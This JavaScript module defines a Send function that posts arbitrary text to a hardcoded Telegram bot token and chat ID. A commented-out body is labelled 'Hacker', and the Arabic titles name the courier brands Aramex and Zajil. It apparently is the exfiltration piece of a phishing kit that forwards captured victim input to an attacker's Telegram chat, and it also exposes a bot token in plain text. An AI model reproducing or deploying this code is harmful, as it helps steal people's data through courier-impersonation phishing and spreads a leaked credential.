import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
              /*  const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: "مدونة ارامكس",
              description: des,
           },
          ],
    };
       */let txt= "مدونة زاجل  %0A"+ des   
         await axios.post(`https://api.telegram.org/bot7816800104:AAFTIrJL464I3Bq2upGIewtYwb4XHRS_CY4/sendMessage?chat_id=7422741721&text=${txt}`) 
    }
  return {
    Send,
}
}

export default TeleSned;
